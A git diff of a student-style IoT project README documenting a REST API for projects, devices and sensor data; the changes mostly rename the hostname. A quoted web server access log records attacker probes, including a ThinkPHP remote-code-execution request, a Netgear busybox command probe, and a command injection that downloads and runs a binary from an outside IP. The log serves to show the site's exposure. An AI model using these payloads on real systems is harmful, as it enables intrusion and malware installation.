@@ -18,7 +18,7 @@ python -m http.server 3000 --directory .\website\testing\d3-website
 Overall the API is designed to be as unopinionated about data as possible while allowing for relationships among devices, data, and projects for organization. In our example implementation, the "SWARM" project inserts and displays data about weather like humidity, temperature, and luminosity, but another project like "WEARABLE-HEALTH" could just as easily insert and display data about heart-rate, body temperature, blood alcohol content, and other similar metrics. To facilitate such flexibility, the only requirements or contract for using the API to the full extent is that 1) a project must be created, 2) a device must be registered under that project, and 3) the device updates data in the "application/json" MIME format. The following endpoints illustrate this flow.
 * `/api/v0/project`
   - post - create a project and recieve a body with the project id
-    - ex) POST `http://swarm-fau4214.eastus.cloudapp.azure.com/api/v0/project`
+    - ex) POST `http://swarm-fau.eastus.cloudapp.azure.com/api/v0/project`
     ```json
     {
       "name": "new-project",
@@ -41,7 +41,7 @@ Overall the API is designed to be as unopinionated about data as possible while 
     }
     ```
   - get - retrieve all projects
-    - ex) GET `http://swarm-fau4214.eastus.cloudapp.azure.com/api/v0/project`
+    - ex) GET `http://swarm-fau.eastus.cloudapp.azure.com/api/v0/project`
     ```json
     {
       "data": [
@@ -60,7 +60,7 @@ Overall the API is designed to be as unopinionated about data as possible while 
     ```
 * `/api/v0/project/<id>`
   - get - retrieve the project that corresponds to the provided project id
-    - ex) GET `http://swarm-fau4214.eastus.cloudapp.azure.com/api/v0/project/5de8d1aace43bb8f1d63035a`
+    - ex) GET `http://swarm-fau.eastus.cloudapp.azure.com/api/v0/project/5de8d1aace43bb8f1d63035a`
     ```json
     {
       "data": {
@@ -76,7 +76,7 @@ Overall the API is designed to be as unopinionated about data as possible while 
     }
     ```
   - put - update the project that corresponds to the provided project id
-    - ex) PUT `http://swarm-fau4214.eastus.cloudapp.azure.com/api/v0/project/5de8d1aace43bb8f1d63035a`
+    - ex) PUT `http://swarm-fau.eastus.cloudapp.azure.com/api/v0/project/5de8d1aace43bb8f1d63035a`
     ```json
     {
       "description": "much better description"
@@ -97,7 +97,7 @@ Overall the API is designed to be as unopinionated about data as possible while 
     }
     ```
   - delete - delete the project that corresponds to the provided project id
-    - ex) DELETE `http://swarm-fau4214.eastus.cloudapp.azure.com/api/v0/project/5de8d1aace43bb8f1d63035a`
+    - ex) DELETE `http://swarm-fau.eastus.cloudapp.azure.com/api/v0/project/5de8d1aace43bb8f1d63035a`
     ```json
     {
         "data": [1],
@@ -108,7 +108,7 @@ Overall the API is designed to be as unopinionated about data as possible while 
 
 * `/api/v0/device`
   - post - create a device and recieve a body with the device id
-    - ex) POST `http://swarm-fau4214.eastus.cloudapp.azure.com/api/v0/device`
+    - ex) POST `http://swarm-fau.eastus.cloudapp.azure.com/api/v0/device`
     ```json
     {
         "name": "markdown-documentation-device",
@@ -134,7 +134,7 @@ Overall the API is designed to be as unopinionated about data as possible while 
     }
     ```
   - get - retrieve all devices
-    - ex) GET `http://swarm-fau4214.eastus.cloudapp.azure.com/api/v0/device`
+    - ex) GET `http://swarm-fau.eastus.cloudapp.azure.com/api/v0/device`
     ```json
     {
         "data": [
@@ -154,7 +154,7 @@ Overall the API is designed to be as unopinionated about data as possible while 
     ```
 * `/api/v0/device/<id>`
   - get - retrieve the device that corresponds to the provided device id
-    - ex) GET `http://swarm-fau4214.eastus.cloudapp.azure.com/api/v0/device/5de8d4a202599bbdd85cc79a`
+    - ex) GET `http://swarm-fau.eastus.cloudapp.azure.com/api/v0/device/5de8d4a202599bbdd85cc79a`
     ```json
     {
         "data": {
@@ -171,7 +171,7 @@ Overall the API is designed to be as unopinionated about data as possible while 
     }
     ```
   - put - update the device that corresponds to the provided device id
-    - ex) PUT `http://swarm-fau4214.eastus.cloudapp.azure.com/api/v0/device/5de8d4a202599bbdd85cc79a`
+    - ex) PUT `http://swarm-fau.eastus.cloudapp.azure.com/api/v0/device/5de8d4a202599bbdd85cc79a`
     ```json
     {
         "meta": {
@@ -195,7 +195,7 @@ Overall the API is designed to be as unopinionated about data as possible while 
     }
     ```
   - delete - delete the device that corresponds to the provided device id
-    - ex) DELETE `http://swarm-fau4214.eastus.cloudapp.azure.com/api/v0/device/5de8d4a202599bbdd85cc79a`
+    - ex) DELETE `http://swarm-fau.eastus.cloudapp.azure.com/api/v0/device/5de8d4a202599bbdd85cc79a`
     ```json
     {
         "data": [1],
@@ -206,7 +206,7 @@ Overall the API is designed to be as unopinionated about data as possible while 
 
 * `/api/v0/raw_data`
   - post - create a raw_data and recieve a body with the raw_data id
-    - ex) POST `http://swarm-fau4214.eastus.cloudapp.azure.com/api/v0/raw_data`
+    - ex) POST `http://swarm-fau.eastus.cloudapp.azure.com/api/v0/raw_data`
     ```json
     {
         "raw": {
@@ -235,7 +235,7 @@ Overall the API is designed to be as unopinionated about data as possible while 
     }
     ```
   - get - retrieve all raw_datas
-    - ex) GET `http://swarm-fau4214.eastus.cloudapp.azure.com/api/v0/raw_data`
+    - ex) GET `http://swarm-fau.eastus.cloudapp.azure.com/api/v0/raw_data`
     ```json
     {
         "data": [
@@ -257,7 +257,7 @@ Overall the API is designed to be as unopinionated about data as possible while 
     ```
 * `/api/v0/raw_data/<id>`
   - get - retrieve the raw_data that corresponds to the provided raw_data id
-    - ex) GET `http://swarm-fau4214.eastus.cloudapp.azure.com/api/v0/raw_data/5de8d63702599bbdd85cc79b`
+    - ex) GET `http://swarm-fau.eastus.cloudapp.azure.com/api/v0/raw_data/5de8d63702599bbdd85cc79b`
     ```json
     {
         "data": {
@@ -276,7 +276,7 @@ Overall the API is designed to be as unopinionated about data as possible while 
     }
     ```
   - put - update the raw_data that corresponds to the provided raw_data id
-    - ex) PUT `http://swarm-fau4214.eastus.cloudapp.azure.com/api/v0/raw_data/5de8d63702599bbdd85cc79b`
+    - ex) PUT `http://swarm-fau.eastus.cloudapp.azure.com/api/v0/raw_data/5de8d63702599bbdd85cc79b`
     ```json
     {
     	"device": "5de8d4a202599bbdd85cc79a",
@@ -305,7 +305,7 @@ Overall the API is designed to be as unopinionated about data as possible while 
     }
     ```
   - delete - delete the raw_data that corresponds to the provided raw_data id
-    - ex) DELETE `http://swarm-fau4214.eastus.cloudapp.azure.com/api/v0/raw_data/5de8d63702599bbdd85cc79b`
+    - ex) DELETE `http://swarm-fau.eastus.cloudapp.azure.com/api/v0/raw_data/5de8d63702599bbdd85cc79b`
     ```json
     {
         "data": [1],
@@ -317,7 +317,7 @@ Overall the API is designed to be as unopinionated about data as possible while 
 ## Website
 The following event loop makes it all happen:
 1. `data-service` polls the API and generates a new mock db that contains all project, device, and raw_data.
-2. `graph-component`, the wrapping component at endpoint `http://swarm-fau4214.eastus.cloudapp.azure.com/data/raw/graph` recieves an observable event notification and transforms the data into a consumable format
+2. `graph-component`, the wrapping component at endpoint `http://swarm-fau.eastus.cloudapp.azure.com/data/raw/graph` recieves an observable event notification and transforms the data into a consumable format
 3. `utility-graph-component` gets this data passed into it and does its best effort in producing a graph.
   - The website uses a combination of D3 and Angular to achieve its visualization effects. As with most graphical applications, updating any image to produce a "real-time" effect requires redrawing. Using this principle, every time there's new data, any visualizations have to be redrawn. Redrawing the plot means several steps:
   1. determining the domain and range of the data
@@ -389,30 +389,30 @@ It may come as a surprise to hear but because this website is publically accessi
 185.153.196.97 - - [04/Dec/2019:17:13:57 +0000] "GET /index.php?s=/Index/\x5Cthink\x5Capp/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP HTTP/1.1"200 406 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
 34.89.243.87 - - [04/Dec/2019:17:30:57 +0000] "OPTIONS / HTTP/1.0" 405 182 "-" "-"
 213.91.164.126 - - [04/Dec/2019:18:21:45 +0000] "GET / HTTP/1.1" 200 808 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
-99.58.98.242 - - [04/Dec/2019:18:24:31 +0000] "GET /assets/raw.jpg HTTP/1.1" 304 0 "http://swarm-fau4214.eastus.cloudapp.azure.com/data" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.97 Safari/537.36"
-99.58.98.242 - - [04/Dec/2019:18:24:31 +0000] "GET /assets/intelligent.jpg HTTP/1.1" 200 216628 "http://swarm-fau4214.eastus.cloudapp.azure.com/data" "Mozilla/5.0 (Macintosh; IntelMac OS X 10_15_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.97 Safari/537.36"
-99.58.98.242 - - [04/Dec/2019:18:26:28 +0000] "GET /device HTTP/1.1" 200 406 "http://swarm-fau4214.eastus.cloudapp.azure.com/project" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.97 Safari/537.36"
-99.58.98.242 - - [04/Dec/2019:18:26:28 +0000] "GET /polyfills-es2015.0ef207fb7b4761464817.js HTTP/1.1" 200 37293 "http://swarm-fau4214.eastus.cloudapp.azure.com/device" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.97 Safari/537.36"
-99.58.98.242 - - [04/Dec/2019:18:26:28 +0000] "GET /styles.1ac3affe9504b81b5cc4.css HTTP/1.1" 200 214050 "http://swarm-fau4214.eastus.cloudapp.azure.com/device" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.97 Safari/537.36"
-99.58.98.242 - - [04/Dec/2019:18:26:28 +0000] "GET /runtime-es2015.e8a2810b3b08d6a1b6aa.js HTTP/1.1" 304 0 "http://swarm-fau4214.eastus.cloudapp.azure.com/device" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.97 Safari/537.36"
-99.58.98.242 - - [04/Dec/2019:18:26:29 +0000] "GET /main-es2015.04808a82e8c15ad0093a.js HTTP/1.1" 200 1848369 "http://swarm-fau4214.eastus.cloudapp.azure.com/device" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.97 Safari/537.36"
-99.58.98.242 - - [04/Dec/2019:18:26:30 +0000] "GET /favicon.ico HTTP/1.1" 200 948 "http://swarm-fau4214.eastus.cloudapp.azure.com/device" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.97 Safari/537.36"
+99.58.98.242 - - [04/Dec/2019:18:24:31 +0000] "GET /assets/raw.jpg HTTP/1.1" 304 0 "http://swarm-fau.eastus.cloudapp.azure.com/data" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.97 Safari/537.36"
+99.58.98.242 - - [04/Dec/2019:18:24:31 +0000] "GET /assets/intelligent.jpg HTTP/1.1" 200 216628 "http://swarm-fau.eastus.cloudapp.azure.com/data" "Mozilla/5.0 (Macintosh; IntelMac OS X 10_15_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.97 Safari/537.36"
+99.58.98.242 - - [04/Dec/2019:18:26:28 +0000] "GET /device HTTP/1.1" 200 406 "http://swarm-fau.eastus.cloudapp.azure.com/project" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.97 Safari/537.36"
+99.58.98.242 - - [04/Dec/2019:18:26:28 +0000] "GET /polyfills-es2015.0ef207fb7b4761464817.js HTTP/1.1" 200 37293 "http://swarm-fau.eastus.cloudapp.azure.com/device" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.97 Safari/537.36"
+99.58.98.242 - - [04/Dec/2019:18:26:28 +0000] "GET /styles.1ac3affe9504b81b5cc4.css HTTP/1.1" 200 214050 "http://swarm-fau.eastus.cloudapp.azure.com/device" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.97 Safari/537.36"
+99.58.98.242 - - [04/Dec/2019:18:26:28 +0000] "GET /runtime-es2015.e8a2810b3b08d6a1b6aa.js HTTP/1.1" 304 0 "http://swarm-fau.eastus.cloudapp.azure.com/device" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.97 Safari/537.36"
+99.58.98.242 - - [04/Dec/2019:18:26:29 +0000] "GET /main-es2015.04808a82e8c15ad0093a.js HTTP/1.1" 200 1848369 "http://swarm-fau.eastus.cloudapp.azure.com/device" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.97 Safari/537.36"
+99.58.98.242 - - [04/Dec/2019:18:26:30 +0000] "GET /favicon.ico HTTP/1.1" 200 948 "http://swarm-fau.eastus.cloudapp.azure.com/device" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.97 Safari/537.36"
 131.91.4.38 - - [04/Dec/2019:18:43:40 +0000] "GET / HTTP/1.1" 200 406 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Safari/605.1.15"
-131.91.4.38 - - [04/Dec/2019:18:43:41 +0000] "GET /polyfills-es2015.0ef207fb7b4761464817.js HTTP/1.1" 200 37293 "http://swarm-fau4214.eastus.cloudapp.azure.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Safari/605.1.15"
-131.91.4.38 - - [04/Dec/2019:18:43:41 +0000] "GET /runtime-es2015.e8a2810b3b08d6a1b6aa.js HTTP/1.1" 200 1485 "http://swarm-fau4214.eastus.cloudapp.azure.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Safari/605.1.15"
-131.91.4.38 - - [04/Dec/2019:18:43:41 +0000] "GET /styles.1ac3affe9504b81b5cc4.css HTTP/1.1" 200 214050 "http://swarm-fau4214.eastus.cloudapp.azure.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Safari/605.1.15"
-131.91.4.38 - - [04/Dec/2019:18:43:44 +0000] "GET /main-es2015.04808a82e8c15ad0093a.js HTTP/1.1" 200 1848369 "http://swarm-fau4214.eastus.cloudapp.azure.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Safari/605.1.15"
-131.91.4.38 - - [04/Dec/2019:18:43:45 +0000] "GET /favicon.ico HTTP/1.1" 200 948 "http://swarm-fau4214.eastus.cloudapp.azure.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Safari/605.1.15"
+131.91.4.38 - - [04/Dec/2019:18:43:41 +0000] "GET /polyfills-es2015.0ef207fb7b4761464817.js HTTP/1.1" 200 37293 "http://swarm-fau.eastus.cloudapp.azure.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Safari/605.1.15"
+131.91.4.38 - - [04/Dec/2019:18:43:41 +0000] "GET /runtime-es2015.e8a2810b3b08d6a1b6aa.js HTTP/1.1" 200 1485 "http://swarm-fau.eastus.cloudapp.azure.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Safari/605.1.15"
+131.91.4.38 - - [04/Dec/2019:18:43:41 +0000] "GET /styles.1ac3affe9504b81b5cc4.css HTTP/1.1" 200 214050 "http://swarm-fau.eastus.cloudapp.azure.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Safari/605.1.15"
+131.91.4.38 - - [04/Dec/2019:18:43:44 +0000] "GET /main-es2015.04808a82e8c15ad0093a.js HTTP/1.1" 200 1848369 "http://swarm-fau.eastus.cloudapp.azure.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Safari/605.1.15"
+131.91.4.38 - - [04/Dec/2019:18:43:45 +0000] "GET /favicon.ico HTTP/1.1" 200 948 "http://swarm-fau.eastus.cloudapp.azure.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Safari/605.1.15"
 71.6.232.9 - - [04/Dec/2019:18:54:01 +0000] "GET / HTTP/1.1" 200 406 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36"
 185.153.196.97 - - [04/Dec/2019:19:25:05 +0000] "GET /index.php?s=/Index/\x5Cthink\x5Capp/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP HTTP/1.1"200 406 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
 87.15.70.139 - - [04/Dec/2019:19:27:32 +0000] "GET / HTTP/1.1" 200 808 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
 149.202.251.78 - - [04/Dec/2019:20:03:18 +0000] "POST /cgi-bin/protected/discover_and_manage.cgi?action=snmp_browser&hst_id=none&snmpv3_profile_id=&ip_address=|cd /tmp; wget http://80.82.67.184/richard; curl -O http://80.82.67.184/richard; chmod +x richard; ./richard;/evil.php|php&snmp_ro_string=public&mib_oid=system&mib_oid_manual=.1.3.6.1.2.1.1&snmp_version=1 HTTP/1.1" 405 182 "-" "-"
 131.91.4.38 - - [04/Dec/2019:20:10:07 +0000] "GET / HTTP/1.1" 200 406 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Safari/605.1.15"
 121.7.25.190 - - [04/Dec/2019:20:54:57 +0000] "GET / HTTP/1.1" 200 808 "-" "-"
-131.91.4.38 - - [04/Dec/2019:21:10:36 +0000] "GET /assets/raw.jpg HTTP/1.1" 200 23609 "http://swarm-fau4214.eastus.cloudapp.azure.com/data" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Safari/605.1.15"
-131.91.4.38 - - [04/Dec/2019:21:10:36 +0000] "GET /assets/intelligent.jpg HTTP/1.1" 200 216628 "http://swarm-fau4214.eastus.cloudapp.azure.com/data" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Safari/605.1.15"
-131.91.4.38 - - [04/Dec/2019:21:10:43 +0000] "GET /assets/d3.jpg HTTP/1.1" 200 108869 "http://swarm-fau4214.eastus.cloudapp.azure.com/data/raw" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Safari/605.1.15"
-131.91.4.38 - - [04/Dec/2019:21:10:43 +0000] "GET /assets/tabular.png HTTP/1.1" 200 27366 "http://swarm-fau4214.eastus.cloudapp.azure.com/data/raw" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Safari/605.1.15"
+131.91.4.38 - - [04/Dec/2019:21:10:36 +0000] "GET /assets/raw.jpg HTTP/1.1" 200 23609 "http://swarm-fau.eastus.cloudapp.azure.com/data" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Safari/605.1.15"
+131.91.4.38 - - [04/Dec/2019:21:10:36 +0000] "GET /assets/intelligent.jpg HTTP/1.1" 200 216628 "http://swarm-fau.eastus.cloudapp.azure.com/data" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Safari/605.1.15"
+131.91.4.38 - - [04/Dec/2019:21:10:43 +0000] "GET /assets/d3.jpg HTTP/1.1" 200 108869 "http://swarm-fau.eastus.cloudapp.azure.com/data/raw" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Safari/605.1.15"
+131.91.4.38 - - [04/Dec/2019:21:10:43 +0000] "GET /assets/tabular.png HTTP/1.1" 200 27366 "http://swarm-fau.eastus.cloudapp.azure.com/data/raw" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Safari/605.1.15"
 131.91.4.38 - - [04/Dec/2019:21:18:38 +0000] "GET /data/raw/table HTTP/1.1" 200 406 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Safari/605.1.15"
 131.91.4.38 - - [04/Dec/2019:21:43:56 +0000] "GET /data/raw/graph HTTP/1.1" 200 406 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Safari/605.1.15"
 212.174.63.188 - - [04/Dec/2019:22:43:20 +0000] "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=busybox&curpath=/&currentsetting.htm=1 HTTP/1.1" 400 182 "-" "Mozilla/5.0"
